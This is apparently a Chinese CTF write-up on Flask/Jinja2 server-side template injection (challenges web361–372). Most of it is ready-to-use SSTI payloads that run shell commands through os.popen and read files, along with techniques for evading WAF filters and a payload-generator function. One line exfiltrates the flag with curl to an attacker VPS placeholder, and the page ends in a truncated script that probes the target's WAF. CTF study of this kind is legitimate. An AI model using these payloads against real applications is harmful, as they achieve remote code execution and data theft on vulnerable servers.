class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__builtins__</span>.eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br><br></code></pre></td></tr></table></figure><h4 id="控制语句getshell">控制语句getshell</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml">原理就是找到含有 __builtins__ 的类，然后利用</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml">#读写文件</span><br><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span><br><span class="xml"></span><br></code></pre></td></tr></table></figure><h2 id="web361">web361</h2><p>常见的flask SSTI攻击，使用花括号从而将攻击语句实现攻击。</p><p>pyjail思路：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>flask自带类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web362">web362</h2><p>不让使用132下标对应的<code>os._wrap_close</code>类，waf就是不让输入3,2的数字</p><p>于是使用数学四则运算绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[17*8-4].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="web363引号过滤">web363（引号过滤）</h2><p>对于Python的引号过滤，我们有如下三种思路</p><ol type="1"><li>使用flask自带的request类实现参数外带，将真正的payload转移到其他攻击语句中</li><li>使用原生的字符串拼接（flask过滤器，构造对应的字符）</li><li>使用chr函数绕过</li><li>使用16进制绕过</li></ol><p>使用flask自带的request类实现参数外带</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.args.wis).read()&#125;&#125;&amp;wis=cat%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure><p>使用原生的字符串拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 这样就构造出了os的字符串</span><br>&#123;&#123;(()|select|string)[<span class="hljs-number">8</span>] + (()|select|string)[<span class="hljs-number">18</span>]&#125;&#125;<br><span class="hljs-comment"># 也可以使用dict函数过滤</span><br>&#123;&#123;(<span class="hljs-built_in">dict</span>(c=o)|join)~(<span class="hljs-built_in">dict</span>(a=s)|join)&#125;&#125;<br></code></pre></td></tr></table></figure><p>使用16进制编码绕过，需要注意的是，此时我们的代码中是\x5f，一直到被模板引擎解析了才转变为具体的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;((lipsum|attr(<span class="hljs-string">&quot;\\x5f\\x5fglo&quot;</span><span class="hljs-string">&quot;bals\\x5f\\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;</span>))|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>))(<span class="hljs-string">&quot;\\x5f\\x5fimport\\x5f\\x5f(\\x22os\\x22)\\x2epopen(\\x22whoami\\x22)\\x2eread()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>使用chr函数绕过，此处因为原生不存在chr函数，因此我们需要先导入chr函数</p><p>这需要使用flask模板中的控制语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% set chr=().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="hljs-string">&#123;% print(cycler.__init__.__globals__.os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="web364args过滤">web364（args过滤）</h2><p>上一题的第一种方法无法使用，但是我们可以使用request的属性。</p><p>同理，我们能用的还有headers，form，values等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(request.cookies.wis).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web365过滤">web365（[]过滤）</h2><p>[]过滤最大的影响就是需要找到能够替代索引或者键名的方法</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 对于list，可以使用pop方法，移除该元素，并获得该元素</span><br>[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>].pop(<span class="hljs-number">4</span>) # <span class="hljs-number">4</span><br><br><span class="hljs-meta"># 对于字符串，get/__getitem__,根据索引获取到对应的值</span><br><br><span class="hljs-meta"># 对于dict，可以使用get或者__getitem__方法，根据键名获取到对应的值</span><br></code></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(</span><br><span class="hljs-string">(config|string).__getitem__(22)+(config|string).__getitem__(40)+(config|string).__getitem__(23)+(config|string).__getitem__(7)+(config|string).__getitem__(279)+(config|string).__getitem__(4)+(config|string).__getitem__(41)+(config|string).__getitem__(40)+(config|string).__getitem__(6)</span><br><span class="hljs-string">).read()&#125;&#125;&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web366_过滤">web366(_过滤)</h2><p>字符串的过滤使用request的参数绕过</p><p>对于_的过滤，__getitem__可行性不高，但是可以使用flask自带的过滤器attr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web367os过滤">web367(os过滤)</h2><p>使用get方法来实现字典中字符串的获取</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).get(<span class="hljs-name">request.cookies.c</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web368花括号过滤">web368(花括号过滤)</h2><p>使用<code>&#123;% %&#125;</code>控制语句来实现绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">print</span>((lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()) %&#125;<br></code></pre></td></tr></table></figure><h2 id="web369request过滤">web369(request过滤)</h2><p>参照365构造字符串的方法，最大的难点在于无法使用"__getitem__"来拼接字符串，但是我们可以利用过滤器将string转化为list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr((()|select|string|list).pop(24)+(()|select|string|list).pop(24)+(()|select|string|list).pop(1)+(()|select|string|list).pop(20)+(()|select|string|list).pop(8)+(()|select|string|list).pop(12)+(()|select|string|list).pop(6)+(()|select|string|list).pop(20)+(()|select|string|list).pop(18)+(()|select|string|list).pop(24)+(()|select|string|list).pop(24)))</span><br><span class="hljs-string">.get((()|select|string|list).pop(8)+(()|select|string|list).pop(18))</span><br><span class="hljs-string">.popen((()|select|string|list).pop(15)+(()|select|string|list).pop(6)+(()|select|string|list).pop(7)+(()|select|string|list).pop(10)+(config|string|list).pop(279)+(()|select|string|list).pop(41)+(()|select|string|list).pop(20)+(()|select|string|list).pop(6)+(()|select|string|list).pop(1)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web370过滤数字">web370（过滤数字）</h2><p>对于Python，布尔类型是继承至int类型，因此也可以完成运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">string_concat</span>(<span class="hljs-params">tar:<span class="hljs-built_in">str</span></span>):</span><br>    config  = <span class="hljs-string">&quot;&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&quot;</span><br>    select = <span class="hljs-string">&quot;&lt;generator object select_or_reject at 0x7f3b57e0c740&gt;&quot;</span><br><br>    res = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tar:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> select:<br>            res.append(<span class="hljs-string">&quot;(()|select|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(select.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res.append(<span class="hljs-string">&quot;(config|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(config.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;+&#x27;</span>.join(res))<br><br>payload[<span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&#123;% print( (lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag&quot;</span>)+<span class="hljs-string">&quot;).read() )%&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>网上看到的别的师傅的payload，<code>~</code>是字符串连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> num=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> numm=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> x=(()|select|string|<span class="hljs-built_in">list</span>).pop(num)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> glob = (x,x,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,x,x)|join %&#125;<br>&#123;%<span class="hljs-built_in">set</span> builtins=x~x~(<span class="hljs-built_in">dict</span>(builtins=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">chr</span>=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> o = <span class="hljs-built_in">dict</span>(o=a,s=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> getitem = x~x~(<span class="hljs-built_in">dict</span>(getitem=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> file = <span class="hljs-built_in">chr</span>(numm)~<span class="hljs-built_in">dict</span>(flag=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="hljs-built_in">open</span>(file).read())%&#125;<br></code></pre></td></tr></table></figure><h2 id="web371-372过滤print">web371-372（过滤print）</h2><p>过滤print，也就是无回显，尝试反弹shell。</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%if(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">__globals__</span>).get(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;curl</span> http://vps_ip:2333/`cat /flag`&#x27;) )%&#125;<br></code></pre></td></tr></table></figure><p>打不动，只能抄别人作业了，使用curl http://xxx/`cat .flag`</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> e=<span class="hljs-built_in">dict</span>(a=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> ee=<span class="hljs-built_in">dict</span>(aa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eee=<span class="hljs-built_in">dict</span>(aaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeee=<span class="hljs-built_in">dict</span>(aaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeee=<span class="hljs-built_in">dict</span>(aaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeee=<span class="hljs-built_in">dict</span>(aaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> x=(()|select|string|<span class="hljs-built_in">list</span>).pop((ee~eeee)|<span class="hljs-built_in">int</span>)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> glob = (x,x,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,x,x)|join %&#125;<br>&#123;%<span class="hljs-built_in">set</span> builtins=x~x~(<span class="hljs-built_in">dict</span>(builtins=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-keyword">import</span>=x~x~(<span class="hljs-built_in">dict</span>(<span class="hljs-keyword">import</span>=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">chr</span>=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> o = <span class="hljs-built_in">dict</span>(o=a,s=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> getitem = x~x~(<span class="hljs-built_in">dict</span>(getitem=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> zero=<span class="hljs-built_in">chr</span>((eeee~eeeeeeee)|<span class="hljs-built_in">int</span>)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> cmd = <br>%&#125;<br>&#123;%<span class="hljs-keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="hljs-built_in">eval</span>(cmd)%&#125;<br>eastjun<br>&#123;%endif%&#125;<br></code></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>简单来说就是找链子，flask相关知识已经说明了。</p><p>当然在比赛里面肯定是各种姿势的绕过，以下总结几种</p><ol type="1"><li><p>request外带绕过</p></li><li><p>16进制编码绕过，</p></li><li><p>chr函数构造</p><p>前提是先找到chr，好处在于结合数字可以构造任意ASCII字符，如`</p></li><li><p>过滤器绕过关键字，()|select|string，config|string|list+pop，dict()|join</p><p>前两种的局限性在于构造的范围被局限，并且必须回显才能确定索引</p><p>dict结合<strong>~/+等字符串拼接</strong>可以构造任意数字、字母and下划线组成的内容</p><p>dict()|join|count还能构造任意数字</p></li><li><p>属性/键值获取，__getitem__和get、pop以及attr过滤器</p></li></ol><p>丢一个一路打下来的脚本：</p><p>包含waf测试、找function</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf_test</span>():</span><br>    <span class="hljs-keyword">global</span> url<br>    wafs = [<span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;cycler&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;__mro__&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>,<br>             <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;__subclasses__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;()&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>, <br>             <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;args&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>,<br>             <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;set&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;123*1&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <br>             <span class="hljs-string">&#x27;__getitem__&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;cookies&#x27;</span>, <span class="hljs-string">&#x27;lipsum&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span> , <span class="hljs-string">&#x27;attr&#x27;</span>,<br>             <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&#x27;&#123;%&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>]<br>    <br>    real_waf = []<br>    <span class="hljs-keyword">for</span> waf <span class="hljs-keyword">in</span> wafs:<br>        r = requests.get(url = url, params=&#123;<span class="hljs-string">&quot;name&quot;</span> : waf&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:(&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            real_waf.append(waf)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waf : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(waf))<br>    <span class="hljs-keyword">return</span> real_waf<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_globals</span>():</span><br>    l = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__())<br>    <span 